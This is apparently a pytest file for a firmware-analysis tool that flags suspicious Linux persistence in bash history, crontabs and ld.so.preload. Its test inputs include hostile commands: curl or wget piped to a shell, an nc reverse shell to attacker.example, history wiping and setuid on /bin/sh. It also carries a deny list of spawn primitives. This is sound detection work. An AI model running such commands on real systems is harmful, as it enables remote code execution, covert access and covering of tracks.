"""Phase κ.C.C — tests for the Linux persistence-triplet walker.

Covers:

- Pure helpers: ``classify_bash_history_line``, ``classify_cron_line``,
  ``classify_ld_preload_line``.
- The 3 sub-parsers: ``_parse_bash_history_file``,
  ``_parse_crontab_file``, ``_parse_ld_so_preload_file`` against
  synthesised text inputs.
- Rule #35b live canary: ``_do_linux_persistence_walk`` against a real
  ORM session via ``make_live_db()`` (no Docker dependency).
- Rule #36 no-execute test gate.
"""
from __future__ import annotations

import pathlib
import re
import uuid

import pytest
from sqlalchemy import select

from app.models import Firmware, Project
from app.models.linux_bash_history_entries import LinuxBashHistoryEntry
from app.models.linux_cron_jobs import LinuxCronJob
from app.models.linux_ld_preload_entries import LinuxLdPreloadEntry
from app.services.linux_persistence_walker import (
    _do_linux_persistence_walk,
    _parse_bash_history_file,
    _parse_crontab_file,
    _parse_ld_so_preload_file,
    classify_bash_history_line,
    classify_cron_line,
    classify_ld_preload_line,
)
from tests._live_db import make_live_db

# ── classify_bash_history_line ───────────────────────────────────────────────


def test_bash_classify_history_dash_c():
    flags = classify_bash_history_line("history -c")
    assert flags["clear_marker"] is True
    assert flags["download_pattern"] is False
    assert flags["priv_esc_pattern"] is False


def test_bash_classify_history_dash_w():
    flags = classify_bash_history_line("history -w; history -c")
    assert flags["clear_marker"] is True


def test_bash_classify_truncate_history_redirect():
    flags = classify_bash_history_line(": > ~/.bash_history")
    assert flags["clear_marker"] is True


def test_bash_classify_rm_history_file():
    flags = classify_bash_history_line("rm -f ~/.bash_history")
    assert flags["clear_marker"] is True


def test_bash_classify_unset_histfile():
    flags = classify_bash_history_line("unset HISTFILE")
    assert flags["clear_marker"] is True


def test_bash_classify_curl_pipe_bash():
    flags = classify_bash_history_line("curl https://evil/foo.sh | bash")
    assert flags["download_pattern"] is True
    assert flags["clear_marker"] is False


def test_bash_classify_wget_pipe_sh():
    flags = classify_bash_history_line("wget http://x/y.sh | sh")
    assert flags["download_pattern"] is True


def test_bash_classify_sudo_su_dash():
    flags = classify_bash_history_line("sudo su -")
    assert flags["priv_esc_pattern"] is True


def test_bash_classify_sudo_dash_i():
    flags = classify_bash_history_line("sudo -i")
    assert flags["priv_esc_pattern"] is True


def test_bash_classify_chmod_setuid():
    flags = classify_bash_history_line("chmod +s /bin/sh")
    assert flags["priv_esc_pattern"] is True


def test_bash_classify_normal_line_no_flags():
    flags = classify_bash_history_line("ls -la /tmp")
    assert flags == {
        "clear_marker": False,
        "download_pattern": False,
        "priv_esc_pattern": False,
    }


# ── classify_cron_line ───────────────────────────────────────────────────────


def test_cron_classify_temp_path_command():
    flags = classify_cron_line(
        schedule_spec="* * * * *", command="/tmp/dropper.sh"
    )
    assert flags["temp_path_command"] is True
    assert flags["reboot_persistence"] is False


def test_cron_classify_dev_shm():
    flags = classify_cron_line(
        schedule_spec="0 * * * *", command="/dev/shm/.evil"
    )
    assert flags["temp_path_command"] is True


def test_cron_classify_var_tmp():
    flags = classify_cron_line(
        schedule_spec="*/5 * * * *", command="/var/tmp/run.sh"
    )
    assert flags["temp_path_command"] is True


def test_cron_classify_reboot_keyword():
    flags = classify_cron_line(
        schedule_spec="@reboot", command="/usr/bin/legit"
    )
    assert flags["reboot_persistence"] is True
    assert flags["temp_path_command"] is False


def test_cron_classify_curl_egress():
    flags = classify_cron_line(
        schedule_spec="* * * * *",
        command="curl https://c2.example | sh",
    )
    assert flags["network_egress_pattern"] is True


def test_cron_classify_wget_egress():
    flags = classify_cron_line(
        schedule_spec="0 0 * * *", command="wget -O- http://x.example/sh"
    )
    assert flags["network_egress_pattern"] is True


def test_cron_classify_nc_egress():
    flags = classify_cron_line(
        schedule_spec="* * * * *", command="nc -e /bin/sh attacker.example 4444"
    )
    assert flags["network_egress_pattern"] is True


def test_cron_classify_legitimate_line_no_flags():
    flags = classify_cron_line(
        schedule_spec="0 4 * * *", command="/usr/sbin/logrotate /etc/logrotate.conf"
    )
    assert flags == {
        "temp_path_command": False,
        "reboot_persistence": False,
        "network_egress_pattern": False,
    }


def test_cron_classify_no_schedule_no_reboot():
    flags = classify_cron_line(schedule_spec=None, command="/tmp/foo")
    assert flags["reboot_persistence"] is False
    assert flags["temp_path_command"] is True


# ── classify_ld_preload_line ─────────────────────────────────────────────────


def test_ld_classify_temp_path():
    flags = classify_ld_preload_line("/tmp/evil.so")
    assert flags["temp_path_library"] is True
    assert flags["world_writable_dir"] is True
    assert flags["unusual_extension"] is False


def test_ld_classify_dev_shm():
    flags = classify_ld_preload_line("/dev/shm/libhook.so")
    assert flags["temp_path_library"] is True
    assert flags["world_writable_dir"] is True


def test_ld_classify_unusual_extension_no_so():
    flags = classify_ld_preload_line("/tmp/payload.dat")
    assert flags["unusual_extension"] is True
    assert flags["temp_path_library"] is True


def test_ld_classify_unusual_extension_png():
    flags = classify_ld_preload_line("/etc/hook.png")
    assert flags["unusual_extension"] is True
    # /etc is not world-writable
    assert flags["world_writable_dir"] is False


def test_ld_classify_versioned_so_ok():
    flags = classify_ld_preload_line("/usr/lib/libfoo.so.1")
    assert flags["unusual_extension"] is False


def test_ld_classify_versioned_so_2_levels():
    flags = classify_ld_preload_line("/usr/lib/libfoo.so.1.2.3")
    assert flags["unusual_extension"] is False


def test_ld_classify_legitimate_path():
    flags = classify_ld_preload_line("/usr/lib/x86_64-linux-gnu/libfoo.so")
    assert flags == {
        "temp_path_library": False,
        "unusual_extension": False,
        "world_writable_dir": False,
    }


# ── _parse_bash_history_file ─────────────────────────────────────────────────


def test_parse_bash_history_basic(tmp_path):
    p = tmp_path / ".bash_history"
    p.write_text("ls -la\necho hello\nhistory -c\n")
    entries = _parse_bash_history_file(p)
    assert len(entries) == 3
    assert entries[0] == {"line_number": 1, "command": "ls -la"}
    assert entries[1] == {"line_number": 2, "command": "echo hello"}
    assert entries[2] == {"line_number": 3, "command": "history -c"}


def test_parse_bash_history_skip_blank_lines(tmp_path):
    p = tmp_path / ".bash_history"
    p.write_text("ls\n\n\necho ok\n")
    entries = _parse_bash_history_file(p)
    assert len(entries) == 2
    assert entries[0]["line_number"] == 1
    assert entries[1]["line_number"] == 4  # line_number preserves source


def test_parse_bash_history_histtimeformat_skipped(tmp_path):
    """Timestamp-only lines like `#1234567890` (HISTTIMEFORMAT) skip."""
    p = tmp_path / ".bash_history"
    p.write_text("#1700000000\nls\n#1700000001\necho ok\n")
    entries = _parse_bash_history_file(p)
    assert len(entries) == 2
    assert entries[0]["command"] == "ls"
    assert entries[1]["command"] == "echo ok"


def test_parse_bash_history_non_utf8_does_not_crash(tmp_path):
    """Non-UTF8 bytes should be replaced, not crash."""
    p = tmp_path / ".bash_history"
    # Mix of valid + invalid UTF-8.
    p.write_bytes(b"valid line\n\xc3\x28 bad byte\nfinal\n")
    entries = _parse_bash_history_file(p)
    assert len(entries) == 3
    assert entries[0]["command"] == "valid line"
    assert entries[2]["command"] == "final"


def test_parse_bash_history_missing_file(tmp_path):
    p = tmp_path / "absent"
    entries = _parse_bash_history_file(p)
    assert entries == []


# ── _parse_crontab_file ──────────────────────────────────────────────────────


def test_parse_crontab_etc_with_user_field(tmp_path):
    """An /etc/crontab line has user field 6."""
    p = tmp_path / "crontab"
    p.write_text(
        "# Comment\n"
        "SHELL=/bin/sh\n"
        "PATH=/usr/local/sbin:/usr/sbin\n"
        "0 1 * * * root /usr/sbin/some-job --flag\n"
        "@reboot bob /tmp/staged.sh\n"
    )
    entries = _parse_crontab_file(p, user_from_filename=False)
    assert len(entries) == 2
    assert entries[0]["schedule_spec"] == "0 1 * * *"
    assert entries[0]["user"] == "root"
    assert entries[0]["command"] == "/usr/sbin/some-job --flag"
    assert entries[1]["schedule_spec"] == "@reboot"
    assert entries[1]["user"] == "bob"
    assert entries[1]["command"] == "/tmp/staged.sh"


def test_parse_crontab_user_spool_without_user_field(tmp_path):
    """A /var/spool/cron/<user> file does NOT have a user field."""
    p = tmp_path / "root"
    p.write_text(
        "# user crontab\n"
        "0 2 * * 1 /usr/local/bin/weekly-job\n"
        "@reboot /opt/start.sh\n"
    )
    entries = _parse_crontab_file(p, user_from_filename=True)
    assert len(entries) == 2
    assert entries[0]["schedule_spec"] == "0 2 * * 1"
    assert entries[0]["user"] == "root"  # filename
    assert entries[0]["command"] == "/usr/local/bin/weekly-job"
    assert entries[1]["schedule_spec"] == "@reboot"
    assert entries[1]["user"] == "root"


def test_parse_crontab_skip_comments_and_blanks(tmp_path):
    p = tmp_path / "crontab"
    p.write_text(
        "# Top comment\n"
        "\n"
        "# Another comment\n"
    )
    entries = _parse_crontab_file(p, user_from_filename=False)
    assert entries == []


def test_parse_crontab_skip_env_assignments(tmp_path):
    p = tmp_path / "crontab"
    p.write_text("MAILTO=root\nSHELL=/bin/bash\n")
    entries = _parse_crontab_file(p, user_from_filename=False)
    assert entries == []


def test_parse_crontab_unparseable_line_preserved(tmp_path):
    """A line that doesn't match special-keyword or 5-field shape still
    emits a row (with schedule_spec=None)."""
    p = tmp_path / "crontab"
    p.write_text("malformed line with no recognizable schedule\n")
    entries = _parse_crontab_file(p, user_from_filename=False)
    assert len(entries) == 1
    assert entries[0]["schedule_spec"] is None
    assert entries[0]["command"] == "malformed line with no recognizable schedule"


def test_parse_crontab_non_utf8(tmp_path):
    p = tmp_path / "crontab"
    p.write_bytes(b"0 1 * * * root /bin/echo \xc3\x28 hello\n")
    entries = _parse_crontab_file(p, user_from_filename=False)
    assert len(entries) == 1
    # Replace byte is in command but doesn't crash.
    assert entries[0]["schedule_spec"] == "0 1 * * *"


# ── _parse_ld_so_preload_file ────────────────────────────────────────────────


def test_parse_ld_so_preload_basic(tmp_path):
    p = tmp_path / "ld.so.preload"
    p.write_text("/usr/lib/libfoo.so\n/tmp/evil.so\n")
    entries = _parse_ld_so_preload_file(p)
    assert len(entries) == 2
    assert entries[0]["library_path"] == "/usr/lib/libfoo.so"
    assert entries[1]["library_path"] == "/tmp/evil.so"


def test_parse_ld_so_preload_skip_comments_blanks(tmp_path):
    p = tmp_path / "ld.so.preload"
    p.write_text("# example\n\n/usr/lib/legit.so\n")
    entries = _parse_ld_so_preload_file(p)
    assert len(entries) == 1
    assert entries[0]["library_path"] == "/usr/lib/legit.so"


def test_parse_ld_so_preload_whitespace_separated(tmp_path):
    """Multiple paths on one line — each gets its own row."""
    p = tmp_path / "ld.so.preload"
    p.write_text("/lib/a.so /lib/b.so /lib/c.so\n")
    entries = _parse_ld_so_preload_file(p)
    assert len(entries) == 3
    assert entries[0]["library_path"] == "/lib/a.so"
    assert entries[1]["library_path"] == "/lib/b.so"
    assert entries[2]["library_path"] == "/lib/c.so"
    # All share line_number=1
    assert all(e["line_number"] == 1 for e in entries)


def test_parse_ld_so_preload_non_utf8(tmp_path):
    p = tmp_path / "ld.so.preload"
    p.write_bytes(b"/lib/libok.so\n/tmp/\xc3\x28evil.so\n")
    entries = _parse_ld_so_preload_file(p)
    assert len(entries) == 2


# ── Rule #35b live canary — end-to-end via make_live_db ──────────────────────


@pytest.mark.asyncio
async def test_do_linux_persistence_walk_no_files_returns_empty(tmp_path):
    """Empty detection root → empty aggregate."""
    async with make_live_db() as db:
        project = Project(
            name="test-kappa-c", description="κ.C.C live canary empty"
        )
        db.add(project)
        await db.flush()

        firmware = Firmware(
            project_id=project.id,
            original_filename="empty.bin",
            storage_path="/tmp/empty",
            file_size=0,
            sha256="0" * 64,
            extracted_path=str(tmp_path),
        )
        db.add(firmware)
        await db.flush()

        result = await _do_linux_persistence_walk(db, firmware.id)
        assert result["bash_history_files_scanned"] == 0
        assert result["cron_files_scanned"] == 0
        assert result["ld_preload_files_scanned"] == 0
        assert result["anomaly_total"] == 0


@pytest.mark.asyncio
async def test_do_linux_persistence_walk_missing_firmware_returns_empty():
    async with make_live_db() as db:
        result = await _do_linux_persistence_walk(db, uuid.uuid4())
        assert result["bash_history_files_scanned"] == 0
        assert result["cron_files_scanned"] == 0
        assert result["ld_preload_files_scanned"] == 0


@pytest.mark.asyncio
async def test_do_linux_persistence_walk_full_triplet(tmp_path):
    """Stage a synthetic rootfs with all 3 artefacts and verify rows
    are persisted across all 3 ORM tables with classifier flags set.
    """
    # Stage filesystem.
    (tmp_path / "root").mkdir()
    (tmp_path / "root" / ".bash_history").write_text(
        "ls -la\nhistory -c\ncurl http://x.example/y.sh | bash\n"
    )

    (tmp_path / "etc").mkdir()
    (tmp_path / "etc" / "crontab").write_text(
        "@reboot root /tmp/dropper.sh\n"
        "0 1 * * * root /usr/sbin/legit\n"
    )

    (tmp_path / "etc" / "ld.so.preload").write_text(
        "/tmp/hook.so\n/usr/lib/legit.so\n"
    )

    async with make_live_db() as db:
        project = Project(
            name="test-kappa-c-full", description="κ.C.C full triplet"
        )
        db.add(project)
        await db.flush()

        firmware = Firmware(
            project_id=project.id,
            original_filename="full.bin",
            storage_path="/tmp/full",
            file_size=0,
            sha256="1" * 64,
            extracted_path=str(tmp_path),
        )
        db.add(firmware)
        await db.flush()

        result = await _do_linux_persistence_walk(db, firmware.id)

        # bash_history: 1 file, 3 lines → 1 clear_marker + 1 download_pattern.
        assert result["bash_history_files_scanned"] == 1
        assert result["bash_history_lines_persisted"] == 3
        assert result["bash_clear_marker_count"] == 1
        assert result["bash_download_pattern_count"] == 1

        # crontab: 1 file, 2 valid lines → 1 reboot + 1 temp_path.
        assert result["cron_files_scanned"] == 1
        assert result["cron_lines_persisted"] == 2
        assert result["cron_reboot_persistence_count"] == 1
        assert result["cron_temp_path_command_count"] == 1

        # ld.so.preload: 1 file, 2 lines → 1 temp_path_library.
        assert result["ld_preload_files_scanned"] == 1
        assert result["ld_preload_lines_persisted"] == 2
        assert result["ld_preload_temp_path_library_count"] == 1

        assert result["anomaly_total"] >= 4  # at least these 4

        # Rule #35b — SELECT persisted rows back.
        bash_rows = (
            await db.execute(
                select(LinuxBashHistoryEntry).where(
                    LinuxBashHistoryEntry.firmware_id == firmware.id
                )
            )
        ).scalars().all()
        assert len(bash_rows) == 3
        # Each row has a stamped suspicious_flags dict.
        for row in bash_rows:
            assert isinstance(row.suspicious_flags, dict)
            assert row.suspicious_flags.get("schema_version") == 1

        cron_rows = (
            await db.execute(
                select(LinuxCronJob).where(
                    LinuxCronJob.firmware_id == firmware.id
                )
            )
        ).scalars().all()
        assert len(cron_rows) == 2
        for row in cron_rows:
            assert row.user == "root"
            assert isinstance(row.suspicious_flags, dict)
            assert row.suspicious_flags.get("schema_version") == 1

        ld_rows = (
            await db.execute(
                select(LinuxLdPreloadEntry).where(
                    LinuxLdPreloadEntry.firmware_id == firmware.id
                )
            )
        ).scalars().all()
        assert len(ld_rows) == 2
        for row in ld_rows:
            assert isinstance(row.suspicious_flags, dict)
            assert row.suspicious_flags.get("schema_version") == 1


# ── Rule #36 no-execute test gate ─────────────────────────────────────────────


def _strip_docstrings_and_comments(source: str) -> str:
    """Remove docstrings, # comments, and string literals from Python
    source so we can scan for ACTUAL code references."""
    import io
    import tokenize

    out_tokens: list[str] = []
    try:
        tokens = list(tokenize.generate_tokens(io.StringIO(source).readline))
    except tokenize.TokenizeError:
        return source

    for tok in tokens:
        if tok.type == tokenize.STRING:
            continue
        if tok.type == tokenize.COMMENT:
            continue
        out_tokens.append(tok.string)
    return " ".join(out_tokens)


def test_walker_no_execute():
    """Rule #36 — linux_persistence_walker.py CODE (not docstrings/comments)
    MUST NOT invoke any spawn primitive nor shell out to bash / crontab
    CLI / ldconfig. The walker reads text files; nothing should source
    bash_history into a shell, run crontab, or invoke ld against
    extracted libraries.
    """
    raw_source = (
        pathlib.Path(__file__).parent.parent
        / "app"
        / "services"
        / "linux_persistence_walker.py"
    ).read_text()
    source = _strip_docstrings_and_comments(raw_source)

    forbidden_spawn = (
        r"subprocess\.(run|Popen|call|check_output|check_call)",
        r"asyncio\.create_subprocess_(exec|shell)",
        r"os\.(system|execvp|execve|spawnvp)",
        r"\brunpy\.run_path\b",
        r"\beval\s*\(",
        r"\bexec\s*\(",
    )
    for pattern in forbidden_spawn:
        matches = re.findall(pattern, source)
        assert not matches, (
            f"Rule #36 violation in linux_persistence_walker.py CODE — "
            f"found {matches} matching {pattern!r}; the walker MUST NOT "
            "invoke spawn primitives against extracted artefacts."
        )

    # Linux-specific execution helpers — wairz must NOT invoke any of these
    # against parsed-but-untrusted content.
    forbidden_linux_cli = (
        r"['\"](?:crontab|ldconfig|ld\.so|/bin/bash|/bin/sh|"
        r"systemctl|systemd-run|runuser)['\"]",
    )
    for pattern in forbidden_linux_cli:
        matches = re.findall(pattern, source)
        assert not matches, (
            f"Rule #36 violation in linux_persistence_walker.py CODE — "
            f"found {matches} matching {pattern!r}; the walker MUST NOT "
            "invoke Linux execution helpers against persistence targets."
        )
